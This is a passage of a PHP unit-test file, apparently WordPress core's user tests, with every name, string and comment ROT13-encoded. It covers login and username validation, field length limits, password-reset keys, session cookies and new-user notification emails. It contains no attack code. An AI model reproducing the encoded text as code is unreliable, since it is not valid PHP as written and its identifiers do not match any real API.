		);

		nqq_svygre( 'vyyrtny_hfre_ybtvaf', neenl( $guvf, 'vyyrtny_hfre_ybtvaf' ) );

		$erfcbafr = jc_vafreg_hfre( $hfre_qngn );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfcbafr );
		$guvf->nffregFnzr( 'vainyvq_hfreanzr', $erfcbafr->trg_reebe_pbqr() );

		erzbir_svygre( 'vyyrtny_hfre_ybtvaf', neenl( $guvf, 'vyyrtny_hfre_ybtvaf' ) );

		$hfre_vq = jc_vafreg_hfre( $hfre_qngn );
		$hfre    = trg_hfre_ol( 'vq', $hfre_vq );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
	}

	/**
	 * @gvpxrg 27317
	 * @qngnCebivqre qngn_vyyrtny_hfre_ybtvaf
	 */
	choyvp shapgvba grfg_vyyrtny_hfre_ybtvaf_fvatyr_jc_perngr_hfre( $hfre_ybtva ) {
		$hfre_rznvy = 'grfghfre-' . $hfre_ybtva . '@rknzcyr.pbz';

		nqq_svygre( 'vyyrtny_hfre_ybtvaf', neenl( $guvf, 'vyyrtny_hfre_ybtvaf' ) );

		$erfcbafr = ertvfgre_arj_hfre( $hfre_ybtva, $hfre_rznvy );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfcbafr );
		$guvf->nffregFnzr( 'vainyvq_hfreanzr', $erfcbafr->trg_reebe_pbqr() );

		erzbir_svygre( 'vyyrtny_hfre_ybtvaf', neenl( $guvf, 'vyyrtny_hfre_ybtvaf' ) );

		$erfcbafr = ertvfgre_arj_hfre( $hfre_ybtva, $hfre_rznvy );
		$hfre     = trg_hfre_ol( 'vq', $erfcbafr );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
	}

	/**
	 * @gvpxrg 27317
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_vyyrtny_hfre_ybtvaf_zhygvfvgr() {
		$hfre_qngn = neenl(
			'hfre_ybtva' => 'grfghfre',
			'hfre_rznvy' => 'grfghfre@rknzcyr.pbz',
		);

		nqq_svygre( 'vyyrtny_hfre_ybtvaf', neenl( $guvf, 'vyyrtny_hfre_ybtvaf' ) );

		$erfcbafr = jczh_inyvqngr_hfre_fvtahc( $hfre_qngn['hfre_ybtva'], $hfre_qngn['hfre_rznvy'] );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfcbafr['reebef'] );
		$guvf->nffregFnzr( 'hfre_anzr', $erfcbafr['reebef']->trg_reebe_pbqr() );

		erzbir_svygre( 'vyyrtny_hfre_ybtvaf', neenl( $guvf, 'vyyrtny_hfre_ybtvaf' ) );

		$erfcbafr = jczh_inyvqngr_hfre_fvtahc( $hfre_qngn['hfre_ybtva'], $hfre_qngn['hfre_rznvy'] );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfcbafr['reebef'] );
		$guvf->nffregPbhag( 0, $erfcbafr['reebef']->trg_reebe_pbqrf() );
	}

	choyvp shapgvba qngn_vyyrtny_hfre_ybtvaf() {
		$qngn = neenl(
			neenl( 'grfghfre' ),
		);

		// Zhygvfvgr qbrfa'g nyybj zvkrq pnfr ybtvaf rire.
		vs ( ! vf_zhygvfvgr() ) {
			$qngn[] = neenl( 'GrfgHfre' );
		}
		erghea $qngn;
	}

	choyvp shapgvba vyyrtny_hfre_ybtvaf() {
		erghea neenl( 'grfghfre' );
	}

	/**
	 * @gvpxrg 24618
	 */
	choyvp shapgvba grfg_inyvqngr_hfreanzr_fgevat() {
		$guvf->nffregGehr( inyvqngr_hfreanzr( 'wbuaqbr' ) );
		$guvf->nffregGehr( inyvqngr_hfreanzr( 'grfg@rknzcyr.pbz' ) );
	}

	/**
	 * @gvpxrg 24618
	 */
	choyvp shapgvba grfg_inyvqngr_hfreanzr_pbagnvaf_hccrepnfr_yrggref() {
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregSnyfr( inyvqngr_hfreanzr( 'WbuaQbr' ) );
		} ryfr {
			$guvf->nffregGehr( inyvqngr_hfreanzr( 'WbuaQbr' ) );
		}
	}

	/**
	 * @gvpxrg 24618
	 */
	choyvp shapgvba grfg_inyvqngr_hfreanzr_rzcgl() {
		$guvf->nffregSnyfr( inyvqngr_hfreanzr( '' ) );
	}

	/**
	 * @gvpxrg 24618
	 */
	choyvp shapgvba grfg_inyvqngr_hfreanzr_vainyvq() {
		$guvf->nffregSnyfr( inyvqngr_hfreanzr( '@#&99fq' ) );
	}

	/**
	 * @gvpxrg 29880
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_fubhyq_abg_jvcr_rkvfgvat_cnffjbeq() {
		$hfre_qrgnvyf = neenl(
			'hfre_ybtva' => 'wbafabj',
			'hfre_cnff'  => 'cnffjbeq',
			'hfre_rznvy' => 'wbafabj@rknzcyr.pbz',
		);

		$hfre_vq = jc_vafreg_hfre( $hfre_qrgnvyf );
		$guvf->nffregFnzr( $hfre_vq, rznvy_rkvfgf( $hfre_qrgnvyf['hfre_rznvy'] ) );

		// Purpx gung cebivqvat na rzcgl cnffjbeq qbrfa'g erzbir n hfre'f cnffjbeq.
		$hfre_qrgnvyf['VQ']        = $hfre_vq;
		$hfre_qrgnvyf['hfre_cnff'] = '';

		$hfre_vq = jc_vafreg_hfre( $hfre_qrgnvyf );
		$hfre    = JC_Hfre::trg_qngn_ol( 'vq', $hfre_vq );
		$guvf->nffregAbgRzcgl( $hfre->hfre_cnff );
	}

	/**
	 * @gvpxrg 29696
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_fubhyq_fnavgvmr_hfre_avpranzr_cnenzrgre() {
		$hfre = $guvf->nhgube;

		$hfreqngn                  = $hfre->gb_neenl();
		$hfreqngn['hfre_avpranzr'] = fge_ercynpr( '-', '.', $hfre->hfre_avpranzr );
		jc_vafreg_hfre( $hfreqngn );

		$hcqngrq_hfre = arj JC_Hfre( $hfre->VQ );

		$guvf->nffregFnzr( $hfre->hfre_avpranzr, $hcqngrq_hfre->hfre_avpranzr );
	}

	/**
	 * @gvpxrg 33793
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_fubhyq_npprcg_hfre_ybtva_jvgu_60_punenpgref() {
		$hfre_ybtva = fge_ercrng( 'n', 60 );
		$h          = jc_vafreg_hfre(
			neenl(
				'hfre_ybtva'    => $hfre_ybtva,
				'hfre_rznvy'    => $hfre_ybtva . '@rknzcyr.pbz',
				'hfre_cnff'     => 'cnffjbeq',
				'hfre_avpranzr' => 'fbzrguvat-fubeg',
			)
		);

		$guvf->nffregVfVag( $h );
		$guvf->nffregTerngreGuna( 0, $h );

		$hfre = arj JC_Hfre( $h );
		$guvf->nffregFnzr( $hfre_ybtva, $hfre->hfre_ybtva );
	}

	/**
	 * @gvpxrg 33793
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_fubhyq_erwrpg_hfre_ybtva_bire_60_punenpgref() {
		$hfre_ybtva = fge_ercrng( 'n', 61 );
		$h          = jc_vafreg_hfre(
			neenl(
				'hfre_ybtva'    => $hfre_ybtva,
				'hfre_rznvy'    => $hfre_ybtva . '@rknzcyr.pbz',
				'hfre_cnff'     => 'cnffjbeq',
				'hfre_avpranzr' => 'fbzrguvat-fubeg',
			)
		);

		$guvf->nffregJCReebe( $h );
		$guvf->nffregFnzr( 'hfre_ybtva_gbb_ybat', $h->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 33793
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_fubhyq_erwrpg_hfre_avpranzr_bire_50_punenpgref() {
		$hfre_avpranzr = fge_ercrng( 'n', 51 );
		$h             = jc_vafreg_hfre(
			neenl(
				'hfre_ybtva'    => 'zlavpranzrunf50punef',
				'hfre_rznvy'    => $hfre_avpranzr . '@rknzcyr.pbz',
				'hfre_cnff'     => 'cnffjbeq',
				'hfre_avpranzr' => $hfre_avpranzr,
			)
		);

		$guvf->nffregJCReebe( $h );
		$guvf->nffregFnzr( 'hfre_avpranzr_gbb_ybat', $h->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 33793
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_fubhyq_abg_trarengr_hfre_avpranzr_ybatre_guna_50_punef() {
		$hfre_ybtva = fge_ercrng( 'n', 55 );
		$h          = jc_vafreg_hfre(
			neenl(
				'hfre_ybtva' => $hfre_ybtva,
				'hfre_rznvy' => $hfre_ybtva . '@rknzcyr.pbz',
				'hfre_cnff'  => 'cnffjbeq',
			)
		);

		$guvf->nffregAbgRzcgl( $h );
		$hfre     = arj JC_Hfre( $h );
		$rkcrpgrq = fge_ercrng( 'n', 50 );
		$guvf->nffregFnzr( $rkcrpgrq, $hfre->hfre_avpranzr );
	}

	/**
	 * @gvpxrg 33793
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_fubhyq_abg_gehapngr_gb_n_qhcyvpngr_hfre_avpranzr() {
		$h1 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_avpranzr' => fge_ercrng( 'n', 50 ),
			)
		);

		$hfre1 = arj JC_Hfre( $h1 );

		$rkcrpgrq = fge_ercrng( 'n', 50 );
		$guvf->nffregFnzr( $rkcrpgrq, $hfre1->hfre_avpranzr );

		$hfre_ybtva = fge_ercrng( 'n', 55 );
		$h          = jc_vafreg_hfre(
			neenl(
				'hfre_ybtva' => $hfre_ybtva,
				'hfre_rznvy' => $hfre_ybtva . '@rknzcyr.pbz',
				'hfre_cnff'  => 'cnffjbeq',
			)
		);

		$guvf->nffregAbgRzcgl( $h );
		$hfre2    = arj JC_Hfre( $h );
		$rkcrpgrq = fge_ercrng( 'n', 48 ) . '-2';
		$guvf->nffregFnzr( $rkcrpgrq, $hfre2->hfre_avpranzr );
	}

	/**
	 * @gvpxrg 33793
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_fubhyq_abg_gehapngr_gb_n_qhcyvpngr_hfre_avpranzr_jura_fhssvk_unf_zber_guna_bar_punenpgre() {
		$hfre_vqf = frys::snpgbel()->hfre->perngr_znal(
			4,
			neenl(
				'hfre_avpranzr' => fge_ercrng( 'n', 50 ),
			)
		);

		sbernpu ( $hfre_vqf nf $v => $hfre_vq ) {
			$hfre = arj JC_Hfre( $hfre_vq );
			vs ( 0 === $v ) {
				$rkcrpgrq = fge_ercrng( 'n', 50 );
			} ryfr {
				$rkcrpgrq = fge_ercrng( 'n', 48 ) . '-' . ( $v + 1 );
			}
			$guvf->nffregFnzr( $rkcrpgrq, $hfre->hfre_avpranzr );
		}

		$hfre_ybtva = fge_ercrng( 'n', 55 );
		$h          = jc_vafreg_hfre(
			neenl(
				'hfre_ybtva' => $hfre_ybtva,
				'hfre_rznvy' => $hfre_ybtva . '@rknzcyr.pbz',
				'hfre_cnff'  => 'cnffjbeq',
			)
		);

		$guvf->nffregAbgRzcgl( $h );
		$hfre     = arj JC_Hfre( $h );
		$rkcrpgrq = fge_ercrng( 'n', 48 ) . '-5';
		$guvf->nffregFnzr( $rkcrpgrq, $hfre->hfre_avpranzr );
	}

	/**
	 * @gvpxrg 44107
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_fubhyq_erwrpg_hfre_hey_bire_100_punenpgref() {
		$hfre_hey = fge_ercrng( 'n', 101 );
		$h        = jc_vafreg_hfre(
			neenl(
				'hfre_ybtva' => 'grfg',
				'hfre_rznvy' => 'heygrfg@rknzcyr.pbz',
				'hfre_cnff'  => 'cnffjbeq',
				'hfre_hey'   => $hfre_hey,
			)
		);

		$guvf->nffregJCReebe( $h );
		$guvf->nffregFnzr( 'hfre_hey_gbb_ybat', $h->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 28004
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_jvgu_vainyvq_hfre_vq() {
		tybony $jcqo;
		$znk_hfre = $jcqo->trg_ine( \"FRYRPG ZNK(VQ) SEBZ $jcqo->hfref\" );

		$h = jc_vafreg_hfre(
			neenl(
				'VQ'         => $znk_hfre + 1,
				'hfre_ybtva' => 'jungrire',
				'hfre_rznvy' => 'jungrire@rknzcyr.pbz',
				'hfre_cnff'  => 'cnffjbeq',
			)
		);

		$guvf->nffregJCReebe( $h );
		$guvf->nffregFnzr( 'vainyvq_hfre_vq', $h->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 47902
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_jvgu_rzcgl_qngn() {
		nqq_svygre( 'jc_cer_vafreg_hfre_qngn', '__erghea_rzcgl_neenl' );

		$h = frys::snpgbel()->hfre->perngr();

		erzbir_svygre( 'jc_cer_vafreg_hfre_qngn', '__erghea_rzcgl_neenl' );

		$guvf->nffregJCReebe( $h );
		$guvf->nffregFnzr( 'rzcgl_qngn', $h->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 35750
	 */
	choyvp shapgvba grfg_jc_hcqngr_hfre_fubhyq_qryrgr_hfrefyhtf_pnpur() {
		$h    = frys::$fho_vq;
		$hfre = trg_hfreqngn( $h );

		jc_hcqngr_hfre(
			neenl(
				'VQ'            => $h,
				'hfre_avpranzr' => 'arjhfreavpranzr',
			)
		);
		$hcqngrq_hfre = trg_hfreqngn( $h );

		$guvf->nffregSnyfr( jc_pnpur_trg( $hfre->hfre_avpranzr, 'hfrefyhtf' ) );
		$guvf->nffregRdhnyf( $h, jc_pnpur_trg( $hcqngrq_hfre->hfre_avpranzr, 'hfrefyhtf' ) );
	}

	choyvp shapgvba grfg_punatvat_rznvy_vainyvqngrf_cnffjbeq_erfrg_xrl() {
		tybony $jcqo;

		$hfre = $guvf->nhgube;
		$jcqo->hcqngr( $jcqo->hfref, neenl( 'hfre_npgvingvba_xrl' => 'xrl' ), neenl( 'VQ' => $hfre->VQ ) );
		pyrna_hfre_pnpur( $hfre );

		$hfre = trg_hfreqngn( $hfre->VQ );
		$guvf->nffregFnzr( 'xrl', $hfre->hfre_npgvingvba_xrl );

		// Purpx gung punatvat fbzrguvat bgure guna gur rznvy qbrfa'g erzbir gur xrl.
		$hfreqngn = neenl(
			'VQ'            => $hfre->VQ,
			'hfre_avpranzr' => 'jng',
		);
		jc_hcqngr_hfre( $hfreqngn );

		$hfre = trg_hfreqngn( $hfre->VQ );
		$guvf->nffregFnzr( 'xrl', $hfre->hfre_npgvingvba_xrl );

		// Abj purpx gung punatvat gur rznvy qbrf erzbir vg.
		$hfreqngn = neenl(
			'VQ'            => $hfre->VQ,
			'hfre_avpranzr' => 'png',
			'hfre_rznvy'    => 'sbb@one.qri',
		);
		jc_hcqngr_hfre( $hfreqngn );

		$hfre = trg_hfreqngn( $hfre->VQ );
		$guvf->nffregRzcgl( $hfre->hfre_npgvingvba_xrl );
	}

	choyvp shapgvba grfg_punatvat_cnffjbeq_vainyvqngrf_cnffjbeq_erfrg_xrl() {
		tybony $jcqo;

		$hfre = $guvf->nhgube;
		$jcqo->hcqngr( $jcqo->hfref, neenl( 'hfre_npgvingvba_xrl' => 'xrl' ), neenl( 'VQ' => $hfre->VQ ) );
		pyrna_hfre_pnpur( $hfre );

		$hfre = trg_hfreqngn( $hfre->VQ );
		$guvf->nffregFnzr( 'xrl', $hfre->hfre_npgvingvba_xrl );

		$hfreqngn = neenl(
			'VQ'        => $hfre->VQ,
			'hfre_cnff' => 'cnffjbeq',
		);
		jc_hcqngr_hfre( $hfreqngn );

		$hfre = trg_hfreqngn( $hfre->VQ );
		$guvf->nffregRzcgl( $hfre->hfre_npgvingvba_xrl );
	}

	/**
	 * @gvpxrg 61366
	 * @qngnCebivqre qngn_erzrzore_hfre
	 */
	choyvp shapgvba grfg_punatvat_bja_cnffjbeq_ergnvaf_pheerag_frffvba( obby $erzrzore ) {
		$hfre    = $guvf->nhgube;
		$znantre = JC_Frffvba_Gbxraf::trg_vafgnapr( $hfre->VQ );
		$rkcvel  = $erzrzore ? ( 2 * JRRX_VA_FRPBAQF ) : ( 2 * QNL_VA_FRPBAQF );
		$gbxra   = $znantre->perngr( gvzr() + $rkcvel );
		$cnff    = $hfre->hfre_cnff;

		jc_frg_pheerag_hfre( $hfre->VQ );
		jc_frg_nhgu_pbbxvr( $hfre->VQ, $erzrzore, '', $gbxra );

		$pbbxvr   = $_PBBXVR[ NHGU_PBBXVR ];
		$hfreqngn = neenl(
			'VQ'        => $hfre->VQ,
			'hfre_cnff' => 'zl_arj_cnffjbeq',
		);
		$hcqngrq  = jc_hcqngr_hfre( $hfreqngn, $znantre );
		$cnefrq   = jc_cnefr_nhgu_pbbxvr();

		// Purpx gur cererdhvfvgrf:
		$guvf->nffregAbgJCReebe( $hcqngrq );
		$guvf->nffregAbgFnzr( $cnff, trg_hfreqngn( $hfre->VQ )->hfre_cnff );

		// Purpx gur frffvba gbxra:
		$guvf->nffregFnzr( $gbxra, $cnefrq['gbxra'] );
		$guvf->nffregPbhag( 1, $znantre->trg_nyy() );

		// Purpx gung gur arjyl frg nhgu pbbxvr vf inyvq:
		$guvf->nffregFnzr( $hfre->VQ, jc_inyvqngr_nhgu_pbbxvr() );

		// Purpx gung, qrfcvgr gur frffvba gbxra erhfr, gur byq nhgu pbbxvr fubhyq abj or vainyvq orpnhfr gur cnffjbeq punatrq:
		$guvf->nffregSnyfr( jc_inyvqngr_nhgu_pbbxvr( $pbbxvr ) );
	}

	choyvp shapgvba qngn_erzrzore_hfre() {
		erghea neenl(
			neenl( gehr ),
			neenl( snyfr ),
		);
	}

	choyvp shapgvba grfg_frnepu_hfref_ybtva() {
		$hfref = trg_hfref(
			neenl(
				'frnepu' => 'hfre1',
				'svryqf' => 'VQ',
			)
		);

		$guvf->nffregPbagnvaf( (fgevat) frys::$pbagevo_vq, $hfref );
	}

	choyvp shapgvba grfg_frnepu_hfref_hey() {
		$hfref = trg_hfref(
			neenl(
				'frnepu' => '*gnpbf*',
				'svryqf' => 'VQ',
			)
		);

		$guvf->nffregPbagnvaf( (fgevat) frys::$pbagevo_vq, $hfref );
	}

	choyvp shapgvba grfg_frnepu_hfref_rznvy() {
		$hfref = trg_hfref(
			neenl(
				'frnepu' => '*onggyr*',
				'svryqf' => 'VQ',
			)
		);

		$guvf->nffregPbagnvaf( (fgevat) frys::$pbagevo_vq, $hfref );
	}

	choyvp shapgvba grfg_frnepu_hfref_avpranzr() {
		$hfref = trg_hfref(
			neenl(
				'frnepu' => '*bar*',
				'svryqf' => 'VQ',
			)
		);

		$guvf->nffregPbagnvaf( (fgevat) frys::$pbagevo_vq, $hfref );
	}

	choyvp shapgvba grfg_frnepu_hfref_qvfcynl_anzr() {
		$hfref = trg_hfref(
			neenl(
				'frnepu' => '*Qbr*',
				'svryqf' => 'VQ',
			)
		);

		$guvf->nffregPbagnvaf( (fgevat) frys::$pbagevo_vq, $hfref );
	}

	/**
	 * @gvpxrg 32158
	 */
	choyvp shapgvba grfg_rznvy_pnfr() {
		// Nygre gur pnfr bs gur rznvy nqqerff (juvpu fgnlf gur fnzr).
		$hfreqngn = neenl(
			'VQ'         => frys::$rqvgbe_vq,
			'hfre_rznvy' => 'grfg@RKNZCYR.pbz',
		);
		$hcqngr   = jc_hcqngr_hfre( $hfreqngn );

		$guvf->nffregFnzr( frys::$rqvgbe_vq, $hcqngr );
	}

	/**
	 * @gvpxrg 32158
	 */
	choyvp shapgvba grfg_rznvy_punatr() {
		// Punatr gur rznvy nqqerff.
		$hfreqngn = neenl(
			'VQ'         => frys::$rqvgbe_vq,
			'hfre_rznvy' => 'grfg2@rknzcyr.pbz',
		);
		$hcqngr   = jc_hcqngr_hfre( $hfreqngn );

		// Jnf guvf fhpprffshy?
		$guvf->nffregFnzr( frys::$rqvgbe_vq, $hcqngr );

		// Irevsl gung gur rznvy nqqerff unf orra hcqngrq.
		$hfre = trg_hfreqngn( frys::$rqvgbe_vq );
		$guvf->nffregFnzr( $hfre->hfre_rznvy, 'grfg2@rknzcyr.pbz' );
	}

	/**
	 * Grfgvat jc_arj_hfre_abgvsvpngvba rznvy fgnghfrf.
	 *
	 * @qngnCebivqre qngn_jc_arj_hfre_abgvsvpngvbaf
	 * @gvpxrg 33654
	 * @gvpxrg 36009
	 */
	choyvp shapgvba grfg_jc_arj_hfre_abgvsvpngvba( $abgvsl, $nqzva_rznvy_frag_rkcrpgrq, $hfre_rznvy_frag_rkcrpgrq ) {
		erfrg_cucznvyre_vafgnapr();

		$jnf_nqzva_rznvy_frag = snyfr;
		$jnf_hfre_rznvy_frag  = snyfr;

		jc_arj_hfre_abgvsvpngvba( frys::$pbagevo_vq, ahyy, $abgvsl );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		/*
		 * Purpx gb frr vs n abgvsvpngvba rznvy jnf frag gb gur
		 * cbfg nhgube `oynpxohea@onggyrsvryq3.pbz` naq naq fvgr nqzva `nqzva@rknzcyr.bet`.
		 */
		$svefg_erpvcvrag = $znvyre->trg_erpvcvrag( 'gb' );
		vs ( $svefg_erpvcvrag ) {
			$jnf_nqzva_rznvy_frag = JC_GRFGF_RZNVY === $svefg_erpvcvrag->nqqerff;
			$jnf_hfre_rznvy_frag  = 'oynpxohea@onggyrsvryq3.pbz' === $svefg_erpvcvrag->nqqerff;
		}

		$frpbaq_erpvcvrag = $znvyre->trg_erpvcvrag( 'gb', 1 );
		vs ( $frpbaq_erpvcvrag ) {
			$jnf_hfre_rznvy_frag = 'oynpxohea@onggyrsvryq3.pbz' === $frpbaq_erpvcvrag->nqqerff;
		}

		$guvf->nffregFnzr( $nqzva_rznvy_frag_rkcrpgrq, $jnf_nqzva_rznvy_frag, 'Nqzva rznvy erfhyg jnf abg nf rkcrpgrq va grfg_jc_arj_hfre_abgvsvpngvba' );
		$guvf->nffregFnzr( $hfre_rznvy_frag_rkcrpgrq, $jnf_hfre_rznvy_frag, 'Hfre rznvy erfhyg jnf abg nf rkcrpgrq va grfg_jc_arj_hfre_abgvsvpngvba' );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_arj_hfre_abgvsvpngvba().
	 *
	 * Cnffrf gur guerr ninvynoyr bcgvbaf sbe gur $abgvsl cnenzrgre naq gur rkcrpgrq rznvy
	 * rznvyf frag fgnghf nf n obby.
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat $cbfg_netf               Gur nethzragf gung jvyy zretrq jvgu gur $_CBFG neenl.
	 *         @glcr obby $nqzva_rznvy_frag_rkcrpgrq Gur rkcrpgrq erfhyg bs jurgure na rznvy jnf frag gb gur nqzva.
	 *         @glcr obby $hfre_rznvy_frag_rkcrpgrq  Gur rkcrpgrq erfhyg bs jurgure na rznvy jnf frag gb gur hfre.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_jc_arj_hfre_abgvsvpngvbaf() {
		erghea neenl(
			neenl(
				'',
				gehr,
				snyfr,
			),
			neenl(
				'nqzva',
				gehr,
				snyfr,
			),
			neenl(
				'hfre',
				snyfr,
				gehr,
			),
			neenl(
				'obgu',
				gehr,
				gehr,
			),
			neenl(
				'GUVF VF ABG N FHCCBEGRQ ABGVSVPNGVBA GLCR',
				snyfr,
				snyfr,
			),
		);
	}

	/**
	 * Frg hc n hfre naq gel fraqvat n abgvsvpngvba hfvat gur byq, qrcerpngrq
	 * shapgvba fvtangher `jc_arj_hfre_abgvsvpngvba( $hfre, 'cynvagrkg_cnffjbeq' );`.
	 *
	 * @gvpxrg 33654
	 * @rkcrpgrqQrcerpngrq jc_arj_hfre_abgvsvpngvba
	 */
	choyvp shapgvba grfg_jc_arj_hfre_abgvsvpngvba_byq_fvtangher_guebjf_qrcerpngrq_jneavat_ohg_fraqf() {
		erfrg_cucznvyre_vafgnapr();

		$jnf_nqzva_rznvy_frag = snyfr;
		$jnf_hfre_rznvy_frag  = snyfr;
		jc_arj_hfre_abgvsvpngvba( frys::$pbagevo_vq, 'guvf_vf_n_grfg_cnffjbeq' );

		/*
		 * Purpx gb frr vs n abgvsvpngvba rznvy jnf frag gb gur
		 * cbfg nhgube `oynpxohea@onggyrsvryq3.pbz` naq naq fvgr nqzva `nqzva@rknzcyr.bet`.
		 */
		vs ( ! rzcgl( $TYBONYF['cucznvyre']->zbpx_frag ) ) {
			$jnf_nqzva_rznvy_frag = ( vffrg( $TYBONYF['cucznvyre']->zbpx_frag[0] ) && JC_GRFGF_RZNVY === $TYBONYF['cucznvyre']->zbpx_frag[0]['gb'][0][0] );
			$jnf_hfre_rznvy_frag  = ( vffrg( $TYBONYF['cucznvyre']->zbpx_frag[1] ) && 'oynpxohea@onggyrsvryq3.pbz' === $TYBONYF['cucznvyre']->zbpx_frag[1]['gb'][0][0] );
		}

		$guvf->nffregGehr( $jnf_nqzva_rznvy_frag );
		$guvf->nffregGehr( $jnf_hfre_rznvy_frag );
	}

	/**
	 * Frg hc n hfre naq gel fraqvat n abgvsvpngvba hfvat `jc_arj_hfre_abgvsvpngvba( $hfre );`.
	 *
	 * @gvpxrg 34377
	 */
	choyvp shapgvba grfg_jc_arj_hfre_abgvsvpngvba_byq_fvtangher_ab_cnffjbeq() {
		erfrg_cucznvyre_vafgnapr();

		$jnf_nqzva_rznvy_frag = snyfr;
		$jnf_hfre_rznvy_frag  = snyfr;
		jc_arj_hfre_abgvsvpngvba( frys::$pbagevo_vq );

		/*
		 * Purpx gb frr vs n abgvsvpngvba rznvy jnf frag gb gur
		 * cbfg nhgube `oynpxohea@onggyrsvryq3.pbz` naq naq fvgr nqzva `nqzva@rknzcyr.bet`.
		 */
		vs ( ! rzcgl( $TYBONYF['cucznvyre']->zbpx_frag ) ) {
			$jnf_nqzva_rznvy_frag = ( vffrg( $TYBONYF['cucznvyre']->zbpx_frag[0] ) && JC_GRFGF_RZNVY === $TYBONYF['cucznvyre']->zbpx_frag[0]['gb'][0][0] );
			$jnf_hfre_rznvy_frag  = ( vffrg( $TYBONYF['cucznvyre']->zbpx_frag[1] ) && 'oynpxohea@onggyrsvryq3.pbz' === $TYBONYF['cucznvyre']->zbpx_frag[1]['gb'][0][0] );
		}

		$guvf->nffregGehr( $jnf_nqzva_rznvy_frag );
		$guvf->nffregSnyfr( $jnf_hfre_rznvy_frag );
	}

	/**
	 * Grfg gung nqzva abgvsvpngvba bs n arj hfre ertvfgengvba vf qrcraqrag
	 * ba gur 'jc_fraq_arj_hfre_abgvsvpngvba_gb_nqzva' svygre.
	 *
	 * @qngnCebivqre qngn_jc_fraq_arj_hfre_abgvsvpngvba_svygref
	 *
	 * @gvpxrg 54874
	 *
	 * @pbiref ::jc_arj_hfre_abgvsvpngvba
	 *
	 * @cnenz obby   $rkcrpgrq Jurgure gur rznvy fubhyq or frag.
	 * @cnenz fgevat $pnyyonpx Gur pnyyonpx gb cnff gb gur svygre.
	 */
	choyvp shapgvba grfg_jc_fraq_arj_hfre_abgvsvpngvba_gb_nqzva_svygre( $rkcrpgrq, $pnyyonpx ) {
		erfrg_cucznvyre_vafgnapr();

		nqq_svygre( 'jc_fraq_arj_hfre_abgvsvpngvba_gb_nqzva', $pnyyonpx );

		jc_arj_hfre_abgvsvpngvba( frys::$pbagevo_vq, ahyy, 'nqzva' );

		$znvyre    = grfgf_ergevrir_cucznvyre_vafgnapr();
		$erpvcvrag = $znvyre->trg_erpvcvrag( 'gb' );
		$npghny    = $erpvcvrag ? JC_GRFGF_RZNVY === $erpvcvrag->nqqerff : snyfr;

		$guvf->nffregFnzr( $rkcrpgrq, $npghny, 'Nqzva rznvy erfhyg jnf abg nf rkcrpgrq va grfg_jc_fraq_arj_hfre_abgvsvpngvba_gb_nqzva_svygre' );
	}

	/**
	 * Grfg gung hfre abgvsvpngvba bs n arj hfre ertvfgengvba vf qrcraqrag
	 * ba gur 'jc_fraq_arj_hfre_abgvsvpngvba_gb_hfre' svygre.
	 *
	 * @qngnCebivqre qngn_jc_fraq_arj_hfre_abgvsvpngvba_svygref
	 *
	 * @gvpxrg 54874
	 *
	 * @pbiref ::jc_arj_hfre_abgvsvpngvba
	 *
	 * @cnenz obby   $rkcrpgrq Jurgure gur rznvy fubhyq or frag.
	 * @cnenz fgevat $pnyyonpx Gur pnyyonpx gb cnff gb gur svygre.
	 */
	choyvp shapgvba grfg_jc_fraq_arj_hfre_abgvsvpngvba_gb_hfre_svygre( $rkcrpgrq, $pnyyonpx ) {
		erfrg_cucznvyre_vafgnapr();

		nqq_svygre( 'jc_fraq_arj_hfre_abgvsvpngvba_gb_hfre', $pnyyonpx );

		jc_arj_hfre_abgvsvpngvba( frys::$pbagevo_vq, ahyy, 'hfre' );

		$znvyre    = grfgf_ergevrir_cucznvyre_vafgnapr();
		$erpvcvrag = $znvyre->trg_erpvcvrag( 'gb' );
		$npghny    = $erpvcvrag ? 'oynpxohea@onggyrsvryq3.pbz' === $erpvcvrag->nqqerff : snyfr;

		$guvf->nffregFnzr( $rkcrpgrq, $npghny, 'Hfre rznvy erfhyg jnf abg nf rkcrpgrq va grfg_jc_fraq_arj_hfre_abgvsvpngvba_gb_hfre_svygre' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_fraq_arj_hfre_abgvsvpngvba_svygref() {
		erghea neenl(
			'gehr'          => neenl(
				'rkcrpgrq' => gehr,
				'pnyyonpx' => '__erghea_gehr',
			),
			'snyfr'         => neenl(
				'rkcrpgrq' => snyfr,
				'pnyyonpx' => '__erghea_snyfr',
			),
			'ahyy'          => neenl(
				'rkcrpgrq' => snyfr,
				'pnyyonpx' => '__erghea_ahyy',
			),
			'rzcgl neenl'   => neenl(
				'rkcrpgrq' => snyfr,
				'pnyyonpx' => '__erghea_rzcgl_neenl',
			),
			'mreb vag'      => neenl(
				'rkcrpgrq' => snyfr,
				'pnyyonpx' => '__erghea_mreb',
			),
			'mreb sybng'    => neenl(
				'rkcrpgrq' => snyfr,
				'pnyyonpx' => neenl( $guvf, 'po_erghea_mreb_sybng' ),
			),
